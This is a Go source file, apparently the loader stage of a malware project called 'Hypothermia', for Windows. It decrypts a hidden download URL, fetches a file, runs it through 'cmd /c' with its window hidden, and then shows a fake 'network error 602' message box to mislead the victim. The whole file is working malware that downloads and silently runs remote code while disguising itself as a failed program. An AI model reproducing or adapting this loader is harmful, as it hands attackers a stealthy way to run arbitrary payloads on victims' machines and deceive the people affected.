package main

import (
	"fmt"
	"os/exec"
	"regexp"
	"syscall"
	"unsafe"

	"Hypothermia/src/utils"
	"Hypothermia/src/utils/crypto"
)

const (
	FAKE_ERROR       bool   = true
	FAKE_ERROR_TITLE string = "Hypothermia"
	FAKE_ERROR_BODY  string = "Hypothermia failed to init: network error 602"
)

var (
	user32 *syscall.LazyDLL  = syscall.NewLazyDLL("user32.dll")
	msgBox *syscall.LazyProc = user32.NewProc("MessageBoxW")
)

var DOWNLOAD_URL string = ""

func main() {
	if isEncrypted(DOWNLOAD_URL) {
		DOWNLOAD_URL = utils_crypto.DecryptBasic(DOWNLOAD_URL)
	}

	path, err := utils.DonwloadFile(DOWNLOAD_URL, "")
	if err != nil {
		fmt.Println(err)
		fmt.Scanln()
		return
	}

	cmd := exec.Command("cmd", "/c", path)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}

	cmd.Stderr = nil
	cmd.Stdout = nil
	cmd.Stdin = nil

	err = cmd.Run()
	if err != nil {
		fmt.Println("🟥 Failed to run")
		fmt.Scanln()
		return
	}

	if FAKE_ERROR {
		body, _ := syscall.UTF16FromString(FAKE_ERROR_BODY)
		title, _ := syscall.UTF16FromString(FAKE_ERROR_TITLE)

		msgBox.Call(
			uintptr(0),
			uintptr(unsafe.Pointer(&body[0])),
			uintptr(unsafe.Pointer(&title[0])),
			uintptr(0x00000000),
		)
	}
}

func isEncrypted(data string) bool {
	if len(data) == 0 {
		return false
	}

	regex := regexp.MustCompile(`[a-zA-Z\.\-_]`)
	if regex.MatchString(data) {
		return false
	}

	return true
}
